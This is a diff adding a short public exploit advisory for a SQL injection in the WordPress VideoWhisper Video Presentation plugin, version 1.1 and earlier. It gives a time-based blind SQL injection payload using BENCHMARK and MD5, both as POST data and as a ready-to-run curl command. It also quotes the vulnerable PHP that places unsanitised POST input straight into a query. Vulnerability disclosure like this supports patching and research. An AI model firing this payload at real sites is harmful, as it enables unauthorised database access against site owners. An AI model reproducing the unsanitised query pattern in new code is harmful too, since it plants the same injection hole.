@@ -1,0 +1,23 @@
+# Exploit Title: WordPress VideoWhisper Video Presentation plugin <= 1.1 SQL Injection Vulnerability
+# Date: 2011-09-02
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/videowhisper-video-presentation.zip
+# Version: 1.1 (tested)
+# Note: magic_quotes has to be turned off
+
+---------------
+PoC (POST data)
+---------------
+http://www.site.com/wp-content/plugins/videowhisper-video-presentation/vp/c_status.php
+ s=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+e.g.:
+curl --data "s=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)-- " http://www.site.com/wp-content/plugins/videowhisper-video-presentation/vp/c_status.php
+
+---------------
+Vulnerable code
+---------------
+$s=$_POST['s'];
+...
+$sql = "SELECT * FROM $table_name where session='$s' and status='1'";
+$session = $wpdb->get_row($sql);
